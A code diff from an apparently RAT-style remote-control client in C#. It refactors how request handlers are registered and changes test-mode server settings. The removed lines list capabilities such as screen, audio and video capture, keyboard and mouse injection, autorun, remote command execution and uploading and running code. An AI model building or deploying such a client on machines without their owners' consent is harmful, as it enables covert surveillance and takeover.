@@ -16,6 +16,7 @@ using RemoteControl.Protocals.Request;
 using RemoteControl.Protocals.Plugin;
 using RemoteControl.Protocals.Utilities;
 using System.Net;
+using System.Reflection;
 using RemoteControl.Protocals.Response;
 using Microsoft.Win32;
 using System.Runtime.InteropServices;
@@ -72,6 +73,7 @@ namespace RemoteControl.Client
                     // 进行运行操作
                     if (CommonUtil.IsMultiRun(MutexName))
                         return;
+                    InitRemoteControlApplication();
                     InitHandlers();
                     StartConnect();
                     heartbeatThread = new Thread(() => StartHeartbeat()) {IsBackground = true};
@@ -81,77 +83,35 @@ namespace RemoteControl.Client
             }
         }
 
+        static void InitRemoteControlApplication()
+        {
+            // 初始化RemoteControlApplication
+            RemoteControlApplication.QuitEvent += OnFireQuit;
+        }
+
         static void InitHandlers()
         {
-            handlers.Add(ePacketType.PACKET_VIEW_REGISTRY_KEY_REQUEST, new RequestViewRegistryKeyHandler());
-            handlers.Add(ePacketType.PACKET_OPE_REGISTRY_VALUE_NAME_REQUEST, new RequestOpeRegistryValueNameHandler());
-            RequestCaptureAudioHandler captureAudioHandler = new RequestCaptureAudioHandler();
-            handlers.Add(ePacketType.PACKET_START_CAPTURE_AUDIO_REQUEST, captureAudioHandler);
-            handlers.Add(ePacketType.PACKET_STOP_CAPTURE_AUDIO_REQUEST, captureAudioHandler);
-            RequestGetProcessesHandler getProcessesHandler = new RequestGetProcessesHandler();
-            handlers.Add(ePacketType.PACKET_GET_PROCESSES_REQUEST, getProcessesHandler);
-            handlers.Add(ePacketType.PACKET_KILL_PROCESS_REQUEST, getProcessesHandler);
-            handlers.Add(ePacketType.PACKET_AUTORUN_REQUEST, new RequestAutoRunHandler());
-            handlers.Add(ePacketType.PACKET_GET_DRIVES_REQUEST, new RequestGetDrivesHandler());
-            handlers.Add(ePacketType.PACKET_GET_SUBFILES_OR_DIRS_REQUEST, new RequestGetSubFilesOrDirsHandler());
-            RequestOpeFileOrDirHandler opeFileOrDirHandler = new RequestOpeFileOrDirHandler();
-            handlers.Add(ePacketType.PACKET_CREATE_FILE_OR_DIR_REQUEST, opeFileOrDirHandler);
-            handlers.Add(ePacketType.PACKET_DELETE_FILE_OR_DIR_REQUEST, opeFileOrDirHandler);
-            handlers.Add(ePacketType.PACKET_COPY_FILE_OR_DIR_REQUEST, opeFileOrDirHandler);
-            handlers.Add(ePacketType.PACKET_MOVE_FILE_OR_DIR_REQUEST, opeFileOrDirHandler);
-            handlers.Add(ePacketType.PACKET_RENAME_FILE_REQUEST, opeFileOrDirHandler);
-            RequestPowerHandler powerHandler = new RequestPowerHandler();
-            handlers.Add(ePacketType.PACKET_SHUTDOWN_REQUEST, powerHandler);
-            handlers.Add(ePacketType.PACKET_REBOOT_REQUEST, powerHandler);
-            handlers.Add(ePacketType.PACKET_SLEEP_REQUEST, powerHandler);
-            handlers.Add(ePacketType.PACKET_HIBERNATE_REQUEST, powerHandler);
-            handlers.Add(ePacketType.PACKET_LOCK_REQUEST, powerHandler);
-            handlers.Add(ePacketType.PACKET_OPEN_URL_REQUEST, new RequestOpenUrlHandler());
-            handlers.Add(ePacketType.PACKET_COMMAND_REQUEST, new RequestCommandHandler());
-            RequestCaptureScreenHandler captureScreenHandler = new RequestCaptureScreenHandler();
-            handlers.Add(ePacketType.PACKET_START_CAPTURE_SCREEN_REQUEST, captureScreenHandler);
-            handlers.Add(ePacketType.PACKET_STOP_CAPTURE_SCREEN_REQUEST, captureScreenHandler);
-            RequestDownloadHandler downloadHandler = new RequestDownloadHandler();
-            handlers.Add(ePacketType.PACKET_START_DOWNLOAD_REQUEST, downloadHandler);
-            handlers.Add(ePacketType.PACKET_STOP_DOWNLOAD_REQUEST, downloadHandler);
-            RequestLockMouseHandler lockMouseHandler = new RequestLockMouseHandler();
-            handlers.Add(ePacketType.PACKET_LOCK_MOUSE_REQUEST, lockMouseHandler);
-            handlers.Add(ePacketType.PACKET_UNLOCK_MOUSE_REQUEST, lockMouseHandler);
-            RequestBlackScreenHandler blackScreenHandler = new RequestBlackScreenHandler();
-            handlers.Add(ePacketType.PAKCET_BLACK_SCREEN_REQUEST, blackScreenHandler);
-            handlers.Add(ePacketType.PAKCET_UN_BLACK_SCREEN_REQUEST, blackScreenHandler);
-            handlers.Add(ePacketType.PACKET_MESSAGEBOX_REQUEST, new RequestMsgBoxHandler());
-            RequestOpeCDHandler opeCDHandler = new RequestOpeCDHandler();
-            handlers.Add(ePacketType.PACKET_OPEN_CD_REQUEST, opeCDHandler);
-            handlers.Add(ePacketType.PACKET_CLOSE_CD_REQUEST, opeCDHandler);
-            RequestPlayMusicHandler playMusicHandler = new RequestPlayMusicHandler();
-            handlers.Add(ePacketType.PACKET_PLAY_MUSIC_REQUEST, playMusicHandler);
-            handlers.Add(ePacketType.PACKET_STOP_PLAY_MUSIC_REQUEST, playMusicHandler);
-            handlers.Add(ePacketType.PACKET_DOWNLOAD_WEBFILE_REQUEST, new RequestDownloadWebFileHandler());
-            handlers.Add(ePacketType.PACKET_MOUSE_EVENT_REQUEST, new RequestMouseEventHandler());
-            handlers.Add(ePacketType.PACKET_KEYBOARD_EVENT_REQUEST, new RequestKeyboardEventHandler());
-            handlers.Add(ePacketType.PACKET_OPEN_FILE_REQUEST, new RequestOpenFileHandler());
-            RequestCaptureVideoHandler capVideoHandler = new RequestCaptureVideoHandler();
-            handlers.Add(ePacketType.PACKET_START_CAPTURE_VIDEO_REQUEST, capVideoHandler);
-            handlers.Add(ePacketType.PACKET_STOP_CAPTURE_VIDEO_REQUEST, capVideoHandler);
-            RequestUploadHandler uploadHandler = new RequestUploadHandler();
-            handlers.Add(ePacketType.PACKET_START_UPLOAD_HEADER_REQUEST, uploadHandler);
-            handlers.Add(ePacketType.PACKET_START_UPLOAD_RESPONSE, uploadHandler);
-            handlers.Add(ePacketType.PACKET_STOP_UPLOAD_REQUEST, uploadHandler);
-            RequestExecCodeHandler execCodeHandler = new RequestExecCodeHandler();
-            execCodeHandler.OnFireQuit = OnFireQuit;
-            handlers.Add(ePacketType.PACKET_TRANSPORT_EXEC_CODE_REQUEST, execCodeHandler);
-            handlers.Add(ePacketType.PACKET_RUN_EXEC_CODE_REQUEST, execCodeHandler);
-            handlers.Add(ePacketType.PACKET_QUIT_APP_REQUEST, new RequestQuitAppHandler() { OnFireQuit = OnFireQuit });
-            handlers.Add(ePacketType.PACKET_RESTART_APP_REQUEST, new RequestRestartAppHandler() { OnFireQuit = OnFireQuit });
+            // 初始化handlers字典
+            var types = Assembly.GetExecutingAssembly().GetTypes();
+            foreach (var type in types)
+            {
+                var attributes = type.GetCustomAttributes(typeof(PacketTypeAttribute), false);
+                if (attributes.Length == 0)
+                    continue;
+
+                var obj = Activator.CreateInstance(type) as IRequestHandler;
+                attributes.Select(s => (PacketTypeAttribute) s)
+                    .ToList()
+                    .ForEach(a => handlers.Add(a.Type, obj));
+            }
         }
 
         static void ReadParameters()
         {
             if (isTestMode)
             {
-                clientParameters.SetServerIP("192.168.0.106");
-                clientParameters.ServerPort = 10086;
+                clientParameters.SetServerIP("127.0.0.1");
+                clientParameters.ServerPort = 10010;
                 clientParameters.OnlineAvatar = "";
                 clientParameters.ServiceName = "";
             }
